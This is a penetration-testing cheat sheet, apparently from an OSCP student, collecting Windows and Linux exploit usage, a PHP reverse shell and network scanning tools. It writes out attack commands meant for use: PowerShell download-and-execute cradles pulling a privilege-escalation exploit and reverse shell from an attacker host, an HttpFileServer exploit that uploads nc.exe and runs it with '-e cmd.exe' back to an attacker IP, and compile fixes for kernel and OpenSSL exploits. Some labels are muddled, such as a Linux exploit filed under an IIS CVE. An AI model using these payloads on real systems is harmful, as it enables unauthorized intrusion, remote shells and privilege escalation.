# Exploits/Tools/Cheatsheets
 
### Windows Exploits

<details><summary>CVE-2017-7269</summary>
<p>
source: https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell

```python
python exploit.py <ip> <port> <attacking-ip> <attacking-port>
```

</p>
</details>


<details><summary>MS16-135 win23k</summary>
<p>
source: https://github.com/EmpireProject/Empire/raw/master/data/module_source/privesc/Invoke-MS16135.ps1


1) Edit ps script at the end of the content to include the following command for executing exploit to trigger nishang reverse powershell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) which is renamed as `shell.ps1`
```powershell
Invoke-MS16032 -Command "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1')"
```

2) Host this file in webserver in your kali machine, you should also host tcp reverse named 'shell.ps1'

3) In victim machine, run command :
```powershell
IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32/Invoke-MS16135.ps1')
```



</p>
</details>

<details><summary>MS14-058 HttpFileServer 2.3.x RCE</summary>
<p>
source: https://www.exploit-db.com/exploits/37064
 
Upload nc.exe into victim machine and performs a reverse shell using nc.exe

```python
    #change these to your webserver for uploading nc.exe
    ip_addr = "192.168.1.20" 
    local_port = "80" 
    #file will be uploaded to and run from C:\Users\Public, change ip and port here to catch your reverse shell
    vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20192.168.1.10%20443%20-e%20cmd.exe"
```
</p>
</details>


<details><summary>MS08-067 Python Remote Exploit</summary>
<p>
source: https://www.exploit-db.com/exploits/40279
edit `shellcode` variable with payload and adjusts NOPS to fit it

</p>
</details>



### Linux Exploits
<details><summary>CVE-2017-7269</summary>
<p>
source: `searchsploit -m exploits/linux/local/18411.c`

If you encountered compilation errors like:
```c
Compilation errors like ' error: ‘CLONE_VM’ undeclared (first use in this function); did you mean ‘CLNEXT’'
```

fix by adding the following above code:
```c
#define _GNU_SOURCE     
#include <sched.h>
```

To Compile:
```bash
gcc 18411.c -o exploit
```


<details><summary>Mod SSL 2.8.7 OpenSSL Exploit (openfartV2.c)</summary>
<p>
source: https://www.exploit-db.com/exploits/764
commented out `#COMMAND2` variable out to download. Can be used seperately with ptrace-kmod for PrivEsc.

Usage:
1. compile code
`gcc -o openfuck openfuckV2.c -lcrypto`
_if you encounter missing ld error while compiling at victim machine, try checking PATH and make sure it is pointing to the 'ld' file_

2. In your ptrace-kmod.c directory start webserver
`python -m SimpleHTTPServer 80`
</p>
</details>

</p>
</details>


<details><summary>Linux Kernel 2.2-4 PrivEsc (ptrace-kmod)</summary>
<p>
source: https://www.exploit-db.com/exploits/3

Works for 2.2.x and 2.4.x kernels.
```c
// include <linux/user.h> <---remove this
// add below 
#include <sys/user.h>
#include <sys/reg.h>
```
</p>
</details>



### Other Exploits
<details><summary>PHP Reverse Shell (pentest monkey)</summary>
<p>
source: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
Works like a charm in linux php LFI situations better than `system('<reverse shell bash code>');`
1. modify code
```c
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```
2. start listener to catch reverse shell
3. upload and run script
</p>
</details>


### Tools
<details><summary>Onetwopunch - wrapper for unicorn and nmap scan</summary>
<p>
source: https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
 
Scan for port using nicornscan (very fast) and chain it with nmap vuln nse script scan
1. ping sweep for online hosts into list
`nmap -v -sn 10.11.1-254 -oG all-hosts.txt`
`grep Up all-hosts.txt > online.hosts.txt`

2. download onetwopunch script
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
 
3. run script with nmap -sV option
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`
 
4. Once complete, navigate to output folder "ndir". Use command to formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`
`wget https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh`
`./scripts/onetwopunch.sh -t online-hosts.txt -p all -i tap0 -n -sV`

5. Navigate to output folder "ndir" and formats all .xml output to html
`for x in $(ls *.xml); do filename=$(echo $x | sed 's/xml/html/') && xsltproc $x -o $filename; done`
</p>
</details>

<details><summary>Droopescan - drupal scanner</summary>
<p>
source: https://github.com/droope/droopescan
 
```
git clone https://github.com/droope/droopescan.git
cd droopescan
pip install -r requirements.txt
droopescan scan drupal -u http://10.11.1.49
```
</p>
</details>

<details><summary>Samba Checker - checks for samba version</summary>
<p>

Checks Samba version as enum4linux messed up?
THanks fellow student OS-40285/rewardone

```bash
./samba_checker.sh <ipaddress> <port>
```
</p>

</details>



